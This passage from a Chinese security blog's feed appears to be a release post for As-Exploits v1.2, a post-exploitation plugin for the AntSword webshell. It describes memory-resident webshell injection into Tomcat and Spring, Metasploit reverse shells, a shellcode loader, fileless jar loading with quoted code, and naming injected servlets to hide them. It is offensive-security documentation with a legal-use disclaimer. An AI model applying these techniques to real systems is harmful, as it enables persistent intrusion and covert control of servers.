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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>As-Exploits v1.2更新</title>
    <link href="https://yzddmr6.tk/posts/as-exploits-v12-update/"/>
    <id>https://yzddmr6.tk/posts/as-exploits-v12-update/</id>
    <published>2021-03-26T13:45:48.000Z</published>
    <updated>2021-06-17T15:12:03.386Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>As-Exploits，中国蚁剑后渗透模块。</p><p>目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。</p><p>其中Payload部分很多借鉴了<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">冰蝎</a>跟<a href="https://github.com/BeichenDream/Godzilla" target="_blank" rel="noopener">哥斯拉</a>的实现，向其开发者们表示感谢！</p><h2 id="支持列表">支持列表</h2><table><thead><tr><th>模块名称\Shell类型</th><th>PHP</th><th>ASPX</th><th>JSP</th></tr></thead><tbody><tr><td>基本信息</td><td>√</td><td>√</td><td>√</td></tr><tr><td>反弹Shell</td><td>√</td><td>√</td><td>√</td></tr><tr><td>内存马</td><td></td><td></td><td>√</td></tr><tr><td>内存马管理</td><td></td><td></td><td>√</td></tr><tr><td>杀软识别</td><td>√</td><td>√</td><td>√</td></tr><tr><td>提权辅助</td><td>√</td><td>√</td><td>√</td></tr><tr><td>屏幕截图</td><td></td><td>√</td><td>√</td></tr><tr><td>ShellCode加载器</td><td></td><td>√</td><td></td></tr><tr><td>Jar加载器</td><td></td><td></td><td>√</td></tr></tbody></table><h2 id="本次更新主要内容">本次更新主要内容</h2><h3 id="aspx增加屏幕截图模块">aspx增加<code>屏幕截图</code>模块</h3><p>我打我自己</p><p>当然实战中需要较高权限。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616755405537-7a1f6d47-412e-4505-89a5-6ae415bdc2e2.png" alt="img"></p><p>因为在<a href="https://yzddmr6.tk/posts/jscript-load-csharp-assembly/">Jscript加载Assembly踩坑记</a>里面解决了Jscript加载c#的问题，所以C#的payload理论上都可以加进去，更多其他的用法就看大家自己发挥了</p><h3 id="jsp增加Jar加载器模块">jsp增加<code>Jar加载器</code>模块</h3><p>打一个jar进去通常有两个用处：</p><p>一是可以用来上传数据库驱动。</p><p>二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。</p><p>冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。</p><h4 id="冰蝎">冰蝎</h4><p>冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。</p><p>net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">private void loadDriver(String scriptType, String databaseType) throws Exception &#123;</span><br><span class="line">    String driverPath = &quot;net/rebeyond/behinder/resource/driver/&quot;;</span><br><span class="line">    Platform.runLater(() -&gt; &#123;</span><br><span class="line">       this.statusLabel.setText(&quot;正在上传数据库驱动……&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">    String os = this.currentShellService.shellEntity.getString(&quot;os&quot;).toLowerCase();</span><br><span class="line">    //根据系统型号选择临时目录</span><br><span class="line">    String remoteDir = os.indexOf(&quot;windows&quot;) &gt;= 0 ? &quot;c:/windows/temp/&quot; : &quot;/tmp/&quot;;</span><br><span class="line">    String libName = null;</span><br><span class="line">    if (scriptType.equals(&quot;jsp&quot;)) &#123; //根据类型选择数据库jdbc</span><br><span class="line">       if (databaseType.equals(&quot;sqlserver&quot;)) &#123;</span><br><span class="line">          libName = &quot;sqljdbc41.jar&quot;;</span><br><span class="line">       &#125; else if (databaseType.equals(&quot;mysql&quot;)) &#123;</span><br><span class="line">          libName = &quot;mysql-connector-java-5.1.36.jar&quot;;</span><br><span class="line">       &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123;</span><br><span class="line">          libName = &quot;ojdbc5.jar&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125; else if (scriptType.equals(&quot;aspx&quot;)) &#123;</span><br><span class="line">       if (databaseType.equals(&quot;mysql&quot;)) &#123;</span><br><span class="line">          libName = &quot;mysql.data.dll&quot;;</span><br><span class="line">       &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123;</span><br><span class="line">          libName = &quot;Oracle.ManagedDataAccess.dll&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    byte[] driverFileContent = Utils.getResourceData(driverPath + libName);</span><br><span class="line">    String remotePath = remoteDir + libName;</span><br><span class="line">    //将jar先上传到临时目录</span><br><span class="line">    this.currentShellService.uploadFile(remotePath, driverFileContent, true);</span><br><span class="line">    Platform.runLater(() -&gt; &#123;</span><br><span class="line">       this.statusLabel.setText(&quot;驱动上传成功，正在加载驱动……&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">    //将libPath传递给服务端加载</span><br><span class="line">    JSONObject loadRes = this.currentShellService.loadJar(remotePath);</span><br><span class="line">    if (loadRes.getString(&quot;status&quot;).equals(&quot;fail&quot;)) &#123;</span><br><span class="line">       throw new Exception(&quot;驱动加载失败:&quot; + loadRes.getString(&quot;msg&quot;));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">       Platform.runLater(() -&gt; &#123;</span><br><span class="line">          if (scriptType.equals(&quot;jsp&quot;)) &#123;</span><br><span class="line">             this.statusLabel.setText(&quot;驱动加载成功，请再次点击“连接”。&quot;);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          this.statusLabel.setText(&quot;驱动加载成功。&quot;);</span><br><span class="line">       &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>webshell获取到libPath然后用URLClassLoader去加载。</p><p>net.rebeyond.behinder.payload.java.Loader</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616727060618-8f36b4a4-4ee7-494e-8389-a5c5866c2b4e.png" alt="img"></p><h4 id="哥斯拉">哥斯拉</h4><p>哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。</p><p>每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。</p><p>但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？</p><p>哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。</p><p>创建了一种新的协议jarmembuff</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616727986121-7d77c07d-beb5-4e99-b595-487317c1b9d5.png" alt="img"></p><p>然后把收到的jar文件的字节数组给放到变量里。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616728016542-3bfe2933-2cb0-404b-a8c1-5be924aa4c81.png" alt="img"></p><p>这样就实现了文件不落地，将jar打入内存的目的。</p><p>本人在As-Exploits里也采用了这种做法。</p><h4 id="小实验">小实验</h4><p>这里做一个小实验</p><p>写一个弹框测试类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class calc &#123;</span><br><span class="line">    public calc() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jar -cvf打包成jar</p><p>开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    Class.forName(&quot;calc&quot;).newInstance();</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>在第一次访问的时候找不到这个类肯定会报错</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616728798236-5f42d565-f8d2-4207-866a-e0f5918dad1b.png" alt="img"></p><p>然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731753286-ed814f11-6947-456b-ad71-145227e32aff.png" alt="img"></p><p>exploit！</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731789889-b2d6e14b-45d2-4bd5-81e8-d4d90a4692a9.png" alt="img"></p><p>再去刷新页面，弹出计算器。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731810008-50d3ff55-3670-4e1a-8679-97e0eb09ae1b.png" alt="img"></p><h3 id="支持返回包加密">支持返回包加密</h3><p>选择reverse解码器</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731909173-9573b05d-e744-4b6a-b52a-34978363052d.png" alt="img"></p><p>返回包数据</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616731886710-3008aa92-7e76-4c61-a3d1-6e732b25d638.png" alt="img"></p><h3 id="内存马兼容Spring">内存马兼容Spring</h3><p>其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring</p><p>首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：<a href="http://yzddmr6.tk">yzddmr6.tk</a>。</p><p>这里有两个细节</p><h4 id="关于反射的坑">关于反射的坑</h4><p>在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。</p><p>去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c</span><br></pre></td></tr></table></figure><p>定位一下问题出在这里</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616382288107-f70c8485-17a8-429c-8f71-dd36b10a8457.png" alt="img"></p><p>意思就是在StandardContext中找不到removeChild这个方法。</p><p>调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119790515-6bdbc527-d9a8-49e7-9eac-4fcd00991577.png" alt="img"></p><p>TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。</p><p>那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别：</p><p>getMethods 获取所有公有方法（包括父类方法）</p><p>getDeclaredMethods 获取本类中的所有方法 (只拿本类中的)</p><p>哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。</p><p>所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119685039-03a1c1c3-961a-43ef-8baa-3ecb7c87c65f.png" alt="img"></p><p>在内存马模块同理，这里直接全部改了，不再用反射。</p><h4 id="addServletMapping的兼容性问题">addServletMapping的兼容性问题</h4><p>要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果：</p><p>tomcat7 只能addServletMapping</p><p>tomcat8 addServletMapping/addServletMappingDecoded都可以</p><p>tomcat9 只能addServletMappingDecoded</p><p>在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。</p><h4 id="Spring下运行截图">Spring下运行截图</h4><p>获取Servlet</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391669240-1a5f577e-4b65-408b-b77f-d90384cacd82.png" alt="img"></p><p>打入蚁剑内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391697077-dbac2859-32ef-42c1-b786-f893f2f17dc5.png" alt="img"></p><p>再次获取Servlet，发现已经有了，并且在第一位。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391715445-48390742-00db-492a-8e89-22d383b12dc6.png" alt="img"></p><p>连接成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391788515-5dffd1ef-a9cb-4268-9978-8a59f05492f7.png" alt="img"></p><p>卸载Servlet</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391861347-dceff8d3-340c-41b2-844b-042c05a2f837.png" alt="img"></p><p>卸载后再次获取Servlet列表</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391870820-995e7229-a447-48df-b478-336157f2ebe6.png" alt="img"></p><p>虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。</p><h2 id="现有模块介绍">现有模块介绍</h2><h3 id="基本信息">基本信息</h3><p>获取当前服务端信息。</p><p>支持类型：php/jsp/aspx</p><p>php</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069591-9ff82346-c14d-4c6f-8753-b2dc9331769d.png" alt="img"></p><p>jsp</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069699-e5122eca-da20-4c47-89cb-dea7069bc741.png" alt="img"></p><p>aspx</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069786-fcdccbc9-9b8a-4741-b721-9d569f572c6d.png" alt="img"></p><h3 id="反弹Shell">反弹Shell</h3><p>跟MSF联动</p><p>支持类型：php/jsp/aspx</p><p>Payload目前支持以下类型：</p><ul><li><p>java/meterpreter/reverse_tcp</p></li><li><p>java/shell/reverse_tcp</p></li><li><p>java/meterpreter/bind_tcp</p></li><li><p>java/shell/bind_tcp</p></li><li><p>php/meterpreter/reverse_tcp</p></li><li><p>php/shell/reverse_tcp</p></li><li><p>php/meterpreter/bind_tcp</p></li><li><p>php/shell/bind_tcp</p></li><li><p>windows/meterpreter/reverse_tcp</p></li><li><p>windows/x64/meterpreter/reverse_tcp<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069884-b24ce1e4-5750-447a-9e94-fad6670cdc7a.png" alt="img"></p></li></ul><h3 id="内存马">内存马</h3><p>一键打入内存Webshell，由于时间仓促，目前仅支持Servlet型内存马。</p><p>支持类型：jsp</p><p>可打入的内存马种类：</p><ul><li><p>AntSword</p></li><li><p>Behinder</p></li><li><p>Godzilla-Base64</p></li><li><p>reGerog<br>组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。<br>其中AntSword类型支持Tomcat(5-9)、Spring。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069978-fd956e7d-1a48-4e78-b647-3beec50634f5.png" alt="img"></p></li></ul><h4 id="打入哥斯拉内存马">打入哥斯拉内存马</h4><p>打入Godzilla-Base64内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070092-c189c186-b482-4a68-af3f-e7c5ee9495f2.png" alt="img"></p><p>在哥斯拉中连接成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070168-2c0cf3c5-bae9-4276-a82b-7388206600fd.png" alt="img"></p><h3 id="杀软识别">杀软识别</h3><p>数据来源是key师傅的项目：<a href="https://github.com/gh0stkey/avList" target="_blank" rel="noopener">avList</a></p><p>通过<code>tasklist /svc</code>获取当前进程列表，识别出其中的杀软。</p><p>支持类型：php/jsp/aspx</p><p>目前支持手动跟自动两种获取方式：</p><ul><li>自动获取<br>自动执行<code>tasklist /svc</code>并分析回显数据。</li><li>手动获取<br>手动输入<code>tasklist /svc</code>的结果。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070862-3a84df77-63d0-49bf-805c-6da597e33749.png" alt="img"></li></ul><h3 id="提权辅助">提权辅助</h3><p>通过<code>systeminfo</code>来获取补丁信息，从而给出提权建议。</p><p>支持类型：php/jsp/aspx</p><p>同样支持手动跟自动两种获取方式。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070944-eee45771-078e-4459-8e7f-e9b3d3b1ef05.png" alt="img"></p><h3 id="屏幕截图">屏幕截图</h3><p>获取目标当前屏幕截图。</p><p>支持类型：jsp/aspx</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071039-6cc28aba-0288-4990-9c22-b6af0acaafde.png" alt="img"></p><h3 id="ShellCode加载器">ShellCode加载器</h3><p>加载shellcode至内存运行。（shellcode为hex格式，且不能有多余空格或换行）</p><p>支持类型：aspx</p><p>以msf为例：msfvenom生成hex格式的shellcode</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071167-d7d96f40-f62b-4671-8e00-af8c4a8a23cf.png" alt="img"></p><p>粘贴进输入框，点击<code>exploit</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071267-a6fc7022-24df-45c6-b917-ee0bf8dd1970.png" alt="img"></p><p>收到Meterpreter会话</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071688-17d8fdc8-3d84-460d-823a-55ad360ccae0.png" alt="img"></p><h3 id="Jar加载器">Jar加载器</h3><p>加载Jar到JVM内存中。过程中文件不落地，可用于上传数据库驱动等。</p><p>支持类型：jsp</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723072100-b0da663d-a7b8-4b6d-a0c2-23a7900af9e8.png" alt="img"></p><h2 id="注意事项">注意事项</h2><p>本插件仅供合法的渗透测试以及爱好者参考学习，请勿用于非法用途，否则自行承担相关责任。</p>]]></content>
    
    <summary type="html">
    
      As-Exploits v1.2更新
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>As-Exploits内存马兼容Spring</title>
    <link href="https://yzddmr6.tk/posts/As-Exploits-Memory-Shell-For-Spring/"/>
    <id>https://yzddmr6.tk/posts/As-Exploits-Memory-Shell-For-Spring/</id>
    <published>2021-03-22T06:14:18.000Z</published>
    <updated>2021-03-22T06:16:01.006Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" 